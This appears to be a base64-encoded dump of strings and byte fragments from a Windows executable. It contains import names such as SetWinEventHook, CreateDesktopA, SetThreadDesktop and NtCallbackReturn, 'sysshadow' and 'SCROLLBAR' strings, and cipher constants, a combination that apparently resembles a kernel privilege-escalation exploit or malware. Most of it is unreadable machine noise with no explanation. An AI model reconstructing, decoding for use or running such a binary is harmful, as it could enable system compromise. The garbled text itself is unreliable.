CBLClRlcm1pbmF0ZVRocmVhZCBsIENyZWF0ZVRocmVhZCAgUgpUbHNTZXRWYWx1ZSAKSGVhcEZyZWUgID4KR2V0Q3VycmVudFRocmVhZElkICBCCkhlYXBBbGxvYyBDClNsZWVwRXggUQpUbHNHZXRWYWx1ZSBLIENyZWF0ZUV2ZW50QSAgLApTZXRUaHJlYWRBZmZpbml0eU1hc2sgIApIZWFwQ3JlYXRlICB0ClZpcnR1YWxQcm90ZWN0ICAKU2V0UHJpb3JpdHlDbGFzcyAgOwpHZXRDdXJyZW50UHJvY2VzcyAxClNldFRocmVhZFByaW9yaXR5IApSZXN1bWVUaHJlYWQgIHYKR2V0TW9kdWxlSGFuZGxlQSAgTwpUbHNBbGxvYyAgMSBDbG9zZUhhbmRsZSAKR2V0UHJvY2Vzc0hlYXAgIFAKVGxzRnJlZSBECkxvYWRMaWJyYXJ5QSAgCkdldFN5c3RlbUluZm8gNQpJc1dvdzY0UHJvY2VzcyAgS0VSTkVMMzIuZGxsICAKVW5ob29rV2luRXZlbnQgIH4KU2V0V2luRXZlbnRIb29rIF0gQ3JlYXRlTWVudSAgClBvc3RRdWl0TWVzc2FnZSAKIEFwcGVuZE1lbnVBIEcKU2V0Q2xhc3NMb25nQSBmClNldFBhcmVudCA7ClNlbmRNZXNzYWdlQSAgClRyYW5zbGF0ZU1lc3NhZ2UgICBDcmVhdGVXaW5kb3dFeEEgIERlZldpbmRvd1Byb2NBICAKUmVnaXN0ZXJDbGFzc0EgIApTZXRNZW51SW5mbyAKU2V0V2luZG93TG9uZ0EgICBHZXRDbGFzc0xvbmdBIEgKU2V0Q2xhc3NMb25nVyAKU2hvd1dpbmRvdyAgeQpTZXRUaHJlYWREZXNrdG9wICAgR2V0Q2xhc3NOYW1lQSAKUG9zdE1lc3NhZ2VBICBDClNldEFjdGl2ZVdpbmRvdyAKU2V0V2luZG93UG9zICAgRGVzdHJveVdpbmRvdyAgRGlzcGF0Y2hNZXNzYWdlQSAgOgpHZXRNZXNzYWdlQSBQIENyZWF0ZURlc2t0b3BBICBDIENsb3NlRGVza3RvcCAgClN5c3RlbVBhcmFtZXRlcnNJbmZvVyBVU0VSMzIuZGxsICAgTnRGcmVlVmlydHVhbE1lbW9yeSBfIE50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5IGIgTnRDYWxsYmFja1JldHVybiAgClJ0bEFsbG9jYXRlSGVhcCBHCk50U2V0VGltZXIgIHYKUnRsSW5pdFVuaWNvZGVTdHJpbmcgIEAKUnRsRnJlZUhlYXAgIE50Q3JlYXRlVGltZXIgaApSdGxHZXRWZXJzaW9uIG50ZGxsLmRsbCAKUnBjU3RyaW5nRnJlZUEgIApVdWlkVG9TdHJpbmdBIFJQQ1JUNC5kbGwgIAptZW1jcHkgIAptZW1zZXQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUCAgICAgIDo6Ojo6Ojo6Ojo6OiAgICAgICMxNzFLMV8xczExMTExMTExMmwyMjI1M3gzKTRcNDQ0NDQhNTw1WzVqNTU1NTU1NTU1NQo2NTZCNk82XDZpNnc2NjY2CjcmN1E3djc3NzcgOT05OTkKOiw6Szp0Onw6Ojo6Ojo6Ogo7NDtBO0o7O2o7ezs7Ozs7OzsKPE48Wjw8cDw8PDw8PAo9MT1nPXs9PTw+Tj52Pj4+Cj97Pz8gcCAgeAoxJzEtMUgxUDFbMW4xdTExMTExLzI9MmgycjIyMjIyMjIwM0szVTNfM3czfjMzMzMzCjRCNFw0NDQ0CjUqNTA1STVlNWs1NTUKNjY2NjY2IDcKN303Nzc3NzcKOFY4ODg4OAo5JzktOUc5Ujl0OTk5OTk5OTk5OTk5OTk5OTk5OTkKOiY6OjpFOlM6XDpvOnk6Ojo6Ojo6Ogo7LTsyOzg7PTtDO1A7bTs7Ozs7Owo8MzxHPFM8aTxyPHs8PDw8PDw8PDw8PD1NPV49bz09PT09PQo+JD45Pk4+Wz4+Pj4+Pj4KPyI/Lz8/P0g/Pz8/Pz8/PyAgICAgICAgIDAKMCgwMjA9MEcwXjBoMHMwfTAwMDAwMAoxSjFsMTExMTExMTExMTMzCjQgNCk0PTQ0NDQ0NDQ0NAo1MTU3NUE1ZDVqNXA1djV8NTU1NTU1NTU1NTU1NTU1NTU1NTU1NSA2CjYkNio2MDY2Njw2QjZINk42VDZaNjZmNmw2cjZ4Nn42NjY2NjY2NjY2NjY2NjY2NjY2NjY2CjcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWQpMVVNWVzNkNTAgICB2CiAgUFBQWXE8XAogICBZdyAgIFMKdF50JDBDeCx0UHwkOEAoCnQkOCtUJDQ7clNDeAogIHQ9RCQwCl9WV1NRTCQ8cTxUCncgICAgICAgIHZGegogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBRIiAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCikgIHggICAgICAgICAgICAgICAgICAgICAgICAgICAgMCAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQgICAKICAgJiAgIAogICAgICAgICAgICAgICAgICAgICAgICAgIiAgICAoICAgCiAgICggICAgICAgICAgICAgIEAgIEAgICAgICAgIAogICAwICAgCiAgIDAgICAgICAgICAgICAgIEAgIEIgICAgICAgICAgICAgICAgICAgICAgID8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTVEFUSUMgIEdsb2JhbFwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgc3lzc2hhZG93ICAgbXNjdGZpbWUgdWkgU0NST0xMQkFSICAgXCBCIGEgcyBlIE4gYSBtIGUgZCBPIGIgaiBlIGMgdCBzIFwgJSBTICAgICAgZCBQICAgOCBsICAgIGQgUCAgIDggbCAgICogZCBQICAgOCBsICAgMiBsIFQgKCBAIGwgICAyIGwgWCAoIEAgeCAoICAgICAgICAgICAKMSAgIHggSCAKMSAgIHggSCAKMiAgIHggSCAKMSAgIHggSCAKMSAgIHggSCAKMiAgIHggSCAKMiAgIHggUCAkCjIgICB4IFAgJAo0ICAgdCAgCjYgICB0ICBcCjggICB0ICBsCjggICB0ICBsCjogICB0ICBsCj8gICB0ICB0CjwgICB0ICB0CjwgICB0ICB0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVQogIFNWV2gmIAogICAgICAgICAgOwogID0gKCAgCiAgID1aKSAgCiAgID05OCAgdHk9OiAgdFk9PyAgdDk9QiAgdAogICAgICA7dSB9CiAgIDNmOUUKWjt1bjt1OgogICBANXgmIAogVmggICBqIGoKICBmIyBAICBmCk1lIEVQRVAKZSBTVldVTVNRUlZXfSB0dXVmPk1adWsKdjw+UEUgIHVgVnh0WQozX15aWVtFRV8KICBWVzUmIAo7ICAgdXRHCiAgIHVNaDAKICAgVjUmIAo7ICAgdXhMCiAgIHZvICAgIHVmQAp1IH5wdT4gICAKaiBoICAgaAogICBqRGpCVwogIDxhaiBqIAogIF5qIGozCiAgRSAgIEVXRwogIHUsICAgZjkKICAgICBzM0QKdCFFU0VFUFNqClMgICBFICAgIF9FCiAgfDxEQCAKdSAgIHVqIHUKICBRaCAgICAKc0RXUGo/VgogICA9eCYgCiBQRCQoQDkKeH1XV1dTdCQKRCQsUHQkLApfVVNWVzUmIAogICAgICA8CiAgaiBqIGoKIFUgICBTVnUKaihEJEhqIFAKRCRURCQgRCRoRCREUEQkTAogIGggICAqCiAgaCAgIGpuJGMKICBoKCMgIGhACiAgaCgjICBoQApRUXQkLFNQdCQoRCRAaCAgIFFQUQogICAgICBRICAgRCQkUVAgICAgICAoIApEJEhEJERQZgogIDNEJCBXNSYgCldXdCQsdCQkdCQsdCQoaCAgIFdQVwogIHo9eCYgCiAgIFFRa2oKICAgRCQoRCQsCmpEJCAgIGpCUAogIGYkICAgJCAgIFBqNwogICAgIGogajcKI3QsOSAgIHUkRCRsUApTU1NEJHhQCiB8JCRqIFgzCiJkOCAgIHAKZiA9TVogdQplIFZXUCwzVQozX15VUVEmIApWM1dQLHVVCkhyX15VUVFlIEUKZDAgICAmIAoxaiBFUGogaCUKICBRUUVQaCAgIAohXVdoIiAgagogICAzVlZWCiAgICAgIFBqCjNQaCAgIFBQUEVQCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgdCwgIGIsICBSLCAgRCwgICAgICAKICAmLCAgICAKLCAgOCwgICAgICAKLyAgLiAgICAgIFQuICBCLiAgLCAgLCAgLCAgLCAgLCAgLCAgLCAgLCAgCi0gIDAtICBCLSAgVC0gIGItICB0LSAgLSAgLSAgLSAgLSAgLSAgLSAgLSAgLSAgCi4gICouICAgICAgICAgICAgICAgICAgLiAgLiAgLiAgLiAgLiAgcC4gIC4gICAgICB8ICAgICAgICAgICAgKCAgKSAgICAgICAgICB+LCAgICggIAogICAgICAgICAgZC4gIHQoICAgICAgICAgICAgLiAgKCAgKSAgICAgICAgICAKLyAgaCggICAgICAgICAgICAgICAgICAgICAgICB0LCAgYiwgIFIsICBELCAgICAgIAogIHogICYsICAKLCAgOCwgICAgICAKLyAgLiAgICAgIFQuICBCLiAgLCAgLCAgLCAgLCAgLCAgLCAgLCAgLCAgCi0gIDAtICBCLSAgVC0gIGItICB0LSAgLSAgLSAgLSAgLSAgLSAgLSAgLSAgLSAgCi4gICouICAgICAgICAgICAgICAgICAgLiAgLiAgLiAgLiAgLiAgcC4gIC4gICAgICAKc3RyY3B5ICAKbWVtc2V0ICA5Cl9zbndwcmludGYgIF4KX3N0cmljbXAgIG1zdmNydC5kbGwgIDsKR2V0Q3VycmVudFByb2Nlc3MgCkdldFN5c3RlbUluZm8gNQpJc1dvdzY0UHJvY2VzcyAgUgpUbHNTZXRWYWx1ZSAKSGVhcEZyZWUgIH4KV2FpdEZvclNpbmdsZU9iamVjdCA+CkdldEN1cnJlbnRUaHJlYWRJZCAgQgpIZWFwQWxsb2MgQwpTbGVlcEV4IFEKVGxzR2V0VmFsdWUgSyBDcmVhdGVFdmVudEEgICwKU2V0VGhyZWFkQWZmaW5pdHlNYXNrICAKSGVhcENyZWF0ZSAgdApWaXJ0dWFsUHJvdGVjdCAgClNldFByaW9yaXR5Q2xhc3MgIDEKU2V0VGhyZWFkUHJpb3JpdHkgClJlc3VtZVRocmVhZCAgdgpHZXRNb2R1bGVIYW5kbGVBICBLClRlcm1pbmF0ZVRocmVhZCBPClRsc0FsbG9jICAxIENsb3NlSGFuZGxlIGwgQ3JlYXRlVGhyZWFkICAKR2V0UHJvY2Vzc0hlYXAgIFAKVGxzRnJlZSBLRVJORUwzMi5kbGwgIApVbmhvb2tXaW5FdmVudCAgfgpTZXRXaW5FdmVudEhvb2sgXSBDcmVhdGVNZW51ICAKUG9zdFF1aXRNZXNzYWdlIAogQXBwZW5kTWVudUEgRwpTZXRDbGFzc0xvbmdBIGYKU2V0UGFyZW50IDsKU2VuZE1lc3NhZ2VBICAKVHJhbnNsYXRlTWVzc2FnZSAgIENyZWF0ZVdpbmRvd0V4QSAgRGVmV2luZG93UHJvY0EgIApSZWdpc3RlckNsYXNzQSAgClNldE1lbnVJbmZvIApTZXRXaW5kb3dMb25nQSAgIEdldENsYXNzTG9uZ0EgSApTZXRDbGFzc0xvbmdXIApTaG93V2luZG93ICB5ClNldFRocmVhZERlc2t0b3AgICBHZXRDbGFzc05hbWVBIApQb3N0TWVzc2FnZUEgIEMKU2V0QWN0aXZlV2luZG93IApTZXRXaW5kb3dQb3MgICBEZXN0cm95V2luZG93ICBEaXNwYXRjaE1lc3NhZ2VBICA6CkdldE1lc3NhZ2VBIApTeXN0ZW1QYXJhbWV0ZXJzSW5mb1cgUCBDcmVhdGVEZXNrdG9wQSAgQyBDbG9zZURlc2t0b3AgIFVTRVIzMi5kbGwgIGgKUnRsR2V0VmVyc2lvbiBiIE50Q2FsbGJhY2tSZXR1cm4gIApSdGxBbGxvY2F0ZUhlYXAgRwpOdFNldFRpbWVyICB2ClJ0bEluaXRVbmljb2RlU3RyaW5nICBAClJ0bEZyZWVIZWFwICBOdENyZWF0ZVRpbWVyIG50ZGxsLmRsbCAKUnBjU3RyaW5nRnJlZUEgIApVdWlkVG9TdHJpbmdBIFJQQ1JUNC5kbGwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjIyMiAzCjMgMyQzTTZTNmk2dzZ9NjY2NjY2NjYlNy83PjdIN1c3YTdwN3o3Nzc3Nzc3NzcKOCI4MThZOHM4ODg4ODg4CjsgOy07OjtHO1U7Yjs7Ozs7CjwxPFY8Zjx+PDw8PQo/LD9VP10/Pz8gCjAgMCkwPjBJMFowYDB7MDAwMDAwMAoxNzE9MU0xezExMTExMTEKMkUyVzIyMjIKMzEzXjMzMzMzNDQKNiA2IjYqNjU2SDZPNjZxNjY2CjdCN0w3WjdrN3c3Nzc3CjglOC84OThROFg4ejg4ODg4Cjk2OTk5OTkKOiM6PjpDOkw6ZTo6OjogO2A7Ozs7Ozs7O148eDx9PDw8PDwKPTs9dj09PT09PSA+Cic+Mj5UPj4+Pj4+Cj8uP3s/Pz8gICAgICA4CiAgITAxMDgwPjBEMEswUTBYMF0wZDBpMHAwdTB8MDAwMDAwMDAwMDAwMDAKMSkxRjFZMWQxcjExMTExMTExMTEKMioyPTJ8MjIyMjIyMjIyCjMmMzwzRTNOM1QzYjNoM3UzMzMzMzMKNCU0NDU0VzRdNGM0aTR1NHs0NDQ0NDQ0NDQ0NDQ0NAo1IjUoNS41NDU6NUA1RjVMNVI1WDVeNWQ1ajVwNXY1fDU1NTU1NTU1NTU1NTU1NTU1NTU1NTUgNgo2JDY2MDY2Njw2QjZINk42VDZaNiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4cGFuZCAzMi1ieXRlIGtleHBhbmQgMTYtYnl0ZSBrY2MKPWomJkxaNjZsQT8/fgo2bm5aWltSUk07O3ZhCn17KSlSPnEvL14KICAgICwgIEAKZ0s5OXJKSkxMWFhKCkNDTU1VMzNmClBQRDw8eCUKJi9fXzVERDkKVX5+Rz09emRkXV0KZiIiRH4qKlQ7CjtWMjJkTjo6dApJbGxWViAlCm94eG8lJUpyCmFhXzU1aldXClVVeCgoUHoKZTFCQmhoQUEpdwo9JiZMajY2bFo/P35BCk80NGhcUTQKW1JSOzt2TQphfSkpUns+Ly9ecQpoICAgICwgQApGZzk5cktKSkxMWFgKQ0NNTTMzZlUKUFA8PHhEJUtRUV1AQApXVX5+PT16R2RkCiIiRGYqKlR+Owp2OzIyZFY6OnROCkM3N25ZbW0Kb3h4JSVKbwpwcD4+fEJxZmYKNTVqX1dXaQpJVVUoKFB4CmN8fHd3e3sKPSZMaiY2bFo2P35BPwpPNGhcNFE0Cm5aWltSUjt2TTsKKVJ7KT4vXnEvCmggICAgLCBAIAo5cks5SkpMTFhYCkNDTU0zZlUzClBQPHhEPCVLUVFdQEAKVX5+PXpHPWQKIkRmIlR+Owp2OzJkVjI6dE46CmI5MTd5eTIKeHglSm8lLlxyLgpwcD58Qj5xCmE1al81V1dpCklVVShQeCgKaEFBKS1ady0KY2N8fHd3e3sKPUxqJiZsWjY2fkE/PwpPaFw0NFE0CnFxc2JTMTEqPwpSRmUjI14wKApublpaW1JSdk07O2F9ClJ7KSk+XnEvLwpTU2ggICAgLEAgIApySzk5SkpMTFhYSgpDQ01NZlUzMwpQUHhEPDwlSwp3dUJjISEgMAovX181REQuOQpXVX5+ekc9PQpEZiIiVH4qKjsKdjtkVjIydE46OgpiYjkxN3l5MkNuWTc3Cnh4Sm8lJVxyClEjfHR0PiEKcHB8Qj4+cQphYWpfNTVXV2kKaWlwIDMtPCIKVVVQeCgoegpoaEFBKVp3CmNjY2N8fHx8d3d3d3t7e3tra2trb29vbzAwMDAKZ2dnZysrKysKfX19fVlZWVlHR0dHCnJycnImJiYmNjY2Nj8/PzQ0NDRxcXFxMTExMQonJycndXV1dQpubm5uWlpaWlJSUlI7Ozs7CikpKSkvLy8vU1NTUyAgICAgICAgW1tbW2pqamoKOTk5OUpKSkpMTExMWFhYWApDQ0NDTU1NTTMzMzNFRUVFClBQUFA8PDw8UVFRUUBAQEA4ODg4ISEhCl9fX19ERERECn5+fn49PT09ZGRkZF1dXV0Kc3Nzc2BgYGBPT09PIiIiIioqKipGRkZGCjIyMjI6Ojo6CmJiYmJ5eXl5Nzc3N21tbW1OTk5ObGxsbFZWVlZlZWVlenp6egp4eHh4JSUlJQpLS0tLcHBwcD4+Pj5mZmZmSEhISAphYWFhNTU1NVdXV1cKVVVVVSgoKCgKQkJCQmhoaGhBQUFBLS0tLQpLVTAgbXZ2CkQ1JmJJWmcKem1ZUi0hdFgpaUlECmp1eHlrPlhxJ08KICFcaFRbOi42JGcgCk8gYWlLd1oKcjtmRDR+W3YpQyNoYzEKPyx9VjMiTkk4CnhQX2piRn5UCnwpMTEjPzBmNTdOdApEeD5oLDQkOEByClZkYXtwMnRcbEhCVwpLMCBVbXZ2CiVPRDUmYlpJCi0hdFhpSSkKRHVqeXg+WGtxJ08KZFxoIVRbLjYkOmcKTyBhS3daaQpyXDtmRH5bNClDdiNoYzEKNnooJj86LHhQIF9qRn5UYgoxIz8qMTBmNU50NwovTXZDTU1UCnk3c1NfW289Cmg+NCQ4LEBfClZke2EycFxsSHRXQlFQQX5TZQolTE8qNSZEYklaJWcKbXpSWS10WCFJKWkKRHVqeHlYaz4ncQpse1JzI0tyCldVZiogKC8KZFxoIVtUNiQ6LgpPYSB3WmlLCiZyXGZEO1s0fkN2KSNoYzFjQgo/fVYsMyJJTjgKKXwxPyoxIzA1Zk50NwovTXZDTVRNCmg+JDgsNF9AClZke2EycGxIdFxCV1FQflNlQQogVTBtdnYlTApPJkQ1YklaJWcKem1ZUi1YIXRJKWlEdWp4eWs+WCdxTwpFbFJ7I3NyCmghXFRbJDouNgpPYSBaaUt3ClxyRDtmWzR+dilDI2hjMUIKP1YsfSIzTkk4CnhqX1RiRn4KKXwxKjEjPzA1ZnQ3Tgovdk1DTVRNCno8R1lVP3MKPmg4LDQkX0AKZFZ7YXAySHRcbEJXUlJSUgpqampqMDAwMDY2NjY4ODg4QEBAQHx8fHw5OTk5Ly8vLzQ0NDRDQ0NDRERERFRUVFR7e3t7MjIyMiMjIyM9PT09TExMTApCQkJCTk5OTgpmZmZmKCgoKCQkJCR2dnZ2W1tbW0lJSUltbW1tJSUlJXJycnJkZGRkaGhoaApcXF1dXV1lZWVlbGxsbHBwcHBISEhIUFBQUF5eXl4KRkZGRldXV1cKa2trazo6OjoKQUFBQU9PT09nZ2dnCnNzc3N0dHR0IiIiIgo1NTU1Nzc3Nwp1dXV1bm5ubkdHR0cKb29vb2JiYmIKVlZWVj4+Pj5LS0tLeXl5eSAgICB4eHh4WlpaWgozMzMzICAgIDExMTEKWVlZWScnJydfX19fYGBgYFFRUVEKLS0tLXp6enoKOzs7O01NTU0qKgo8PDw8U1NTU2FhYWEKfn5+fnd3d3cmJiYmaWlpaQpjY2NjVVVVVSEhIQp9fX19ICAgCiAgICAgICBAICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAKICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgCiAgICAgICAgICAgICAgCiAgICAgICAgICAkQAogICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgCiBDbG9zZUhhbmRsZSAgQ3JlYXRlVGhyZWFkICBLRVJORUwzMi5kbGwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgNn1JMDVoS0t6U0Jian0KUUNvIzJzeF4xJkR2I1MgUTUkCl8vR00zeEMKNTx6LGV9XgoxV0d+azpneFBIZwogZSA1NkIrNnYKKVVDWENEPQp2bXwvVnZlZCIkCntBIDtNXDQ3XXkgQnUKN0RrMTp6bjkKZEEmMy4yLwpNSHBGOUpYTDctCktSbHxiJTc+LgopcVQ+IX10Y0wnClBodjldQElnX3gKQHg7IH1OSFMqLgpLZ34ldDAqCjFSSyNSOUNsaStOfgpWSjhRWFlFTTNeaApSeWVYN2REYWRuSFQgZFBZcAp9O1t0YiB+XSNXKycKb1EgdjV2U2t0ZHoKcS49a1dNMDRYRiAgYzlzCmc2ITR1ZTQyKmQtRlchCkxFVVMpLmdPRwogYVkiSFxUCng8clVKS2t9MgpyVk0gOiMhaTEkQzpwCiZyNzxdTTogIQogcH1rPn0sCmwmSnJmYiAgICAgNSAgIGEgICAgICAKOktQW198QjlCbChRbApNOlY8Kj0iW2kvfQpDJTxFKUNtNHBiCiZUUSBYMl4tIDJYcQpxfSpAdnYxaQogTCgzWT5xCjZmS1she0AKOGFeI3oiOGMKVEBTJDcvMQpSTyE+SC1WeEg1SFQobF8KazRbIGUneQooc0J8OlxHRQogOSxeMC09fFhUODpuCmNQKVY5ZDNnfnM5RQpRMS11ZX19Ck1OOmcgYiZ2QApZPFMyQDc8PGwKKDZVRXtOTmIKbjdkQUE/LgouLnomKnMiCkw1LSM9WCEKSCFtVn1abycgVS9fbE0gCipibT9nX1IKPj1vSGd6YS4KaD5cb2dwQlwKUjxuSi9FNTEKOm9PJVkuXXIKayNRb1FiajtPRwpmZzsnXUxRRzlwSE0qcjNrXDNSCnlhUEk8V31BNgpTJGdAUzZCNgpyZikhXV9ECiJ6YS46ICAgICB1ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAganRyU25QRVlZNVl0Yk5YcHg2NmduVDZYVEhqaUtjOXhzZGYgIDMqZTcKOGhnLEZXUCdcamlUUjQqLCJHO1V+KXZvNyUwbkoKWS1cYShiVywjCntiV3cpfEYKWTYgfigieWE5IHIKLSksJEZXJQpecWVAIXUgCjsgJ34zZSIgCl00M3puTF0KbG9DdW9rSj8KP0UgVDUtP0xSMVwKXUQgeip0IiBCJHt0KG1oWzwjSTYKY0hmaD84IzcsIHB8PVs0QQpuXzYnTClqeklYClZpM1pSezdZb2YKKURZMnNmJgo4cVpfL3g/CkQ/IHVKLWsKWFNkNXJHK2wKZHV0RSM9bT8naUJLCk40bFVZKTE1VVQre3RSCjZXPjB8d1xfNFZUVQpbakNxTTp3J1FfNVItKSAKeD9STHQ0agopTjJ2bXx9CmI3JCZiRTgKfHlPKHY4alcKYTM/LlUrOgpqXzkvU31iZQpPPlVmc1h2cDMzCjgvZXZ2d0EKW00xd3luIUF+Z2pWCj13fDxTLzwiCj9iSzM+TyktcClzIEd+dAo0THh0UyA1QTx9cU5ENwp0PGogajhyNHg6Wgp1PiFvPF1YdkcKUj16amhSaQpbQ2ogMC9qP1kKJ0o7TzBeZApfdyRMPj9+PFshfQotVDolSzVLKgpedD1KV1RmCkMzO1BKPUAwIlZRTS4lMgpvNTxuICApIApeRypUR1BtQQpHIE0jIyFlCi54LFBrQWJ9eUU8CklxciNCIFdNKkpYfQozV2sgfnYpXEsKZUJiVClbLXUgIW4KbFg2RlghZ1JTICVLClNdWmkgUiBESyQKWVRFSC85LFpyCiV3TC9mcncoJGRiKFJlNXYKdSAubix7bwpzWEMsR2EgCjhsQFZGPU95Z2Q3aHkKR2dQYThlbyogZkAKTlF1SVYidgojT3VVbFQyPAoiPlZ5QE5+R2MgRnl1dnQKeChUejpmZnEhCnZacG45cn5rCikmc1JOVV9sCkdLI2JYSUp6LQpTXWlCaGVuVk9HOC4KZDdEdTYibAoiIz5EdUs6CjhYOWFHZ0QKJ0AuMXpnQgp0cnBiWGN4YkUKICA/W1pJJFU6RjlWKkUvW0IKJSlrWnsyOwpvV1toUSQsCjVjIH5+QEQiKwpbXjBlNyRTSF0iLEcvKSBbPEsKKF1oanxrIwohREoiNGIiCj5qWXsteW9Fb2gKbGhYN2YvI2cKdkFta3x4VDs2Ygp6ei48dThCdQogRWVKUnNFPS0KY0xRWyliYV4hCm5FJSVRPD4KRXJEWXpYIAoxPCIiajxiZll6I3JJCjpWRiApenxjClMzZEhiMlQKdCRWJENERkxGYSpSeHgoNT5dPwonck5CSFU+IgpocldDVDQyCj1VdExjLVx6Cjt7PVIvZUl5MgpEeFZNN1NsCjhCJTY7Im9WJk5DZApSYWtSOUdYXE50JlIKZDIrUEwgNysyTTQKWTlVXjxFQAp8SSA8VidsCjtvNjU9IEwKck5ZTl1JempRfiBSL0N+IgpZJHdIayZybwpLajxAaXUvCkN9YW5Vd3cKVmZiaXVEIHhyClpOZUh4PDAKbz0iXHJjZV9ECn5yWzIwVEg+bSIgIG4mClFbICJvIDYpKQp7IDhnS0J6MgpQPDx3OiVmQgpFR1khMWY6Vi8nfQo3Z0B3WDt8CldJIU16e1JRCjBOVkInamkKUjxMcGReOwpXL1UvPkZRJApHTnM5IG1OamwKLCB+X0ghLWZ5CnVKdUF5elIKXXo/XSRZJj40MXZbCjkpdSo1IEYKcWFyelNKeQp+UVZ4ZkZ3CiU8QSxIQzQ5bCcnWApsfi1CRl5EKW98MjAKSFFPeXBDNHsKZEBMMldeIHUKfVdIJSBWQ1o7eX0KaE4gZCA/QHg+Nz1kJyAxXy4KPCppd0h1ZQpvfXh8L0pbCnxvMz47dSRzCiAvfC82e0k9cjdhCl9HWnkhM3xmCkA8RjhqVSB4KC0mCntLVjR5ZSdcRkkKM1pRSCw+IEY1IF0KNkdZdTEsYlAKZjJ+TVtTLXUKZXJ6dSEyIApqImdxRERhLy4yYgp3PjtjbjFXClZyfmNqQ2MpCk4pTCR3Ml1OWW8qbkw+CnxBaEF4LjgKcTEnXFY5aH4KL01yV1JmJilbUzIrCmtcSyAtbzRNQTlbeyRwbzZ1fAp3V1BYXD1CCjM3aWozJSMKOVRdN3FcVwptN3YvRT1jCns/WEJBXWYKUihrJDZvRnNMCmFZZUNZNHx4TSMgCmN0Mk1ZSjAKWyAqcV1MWwopX2lCNzhXClhWPj5taF4KNHksWyBsMlYKO25xQkE9Vi4KfDkg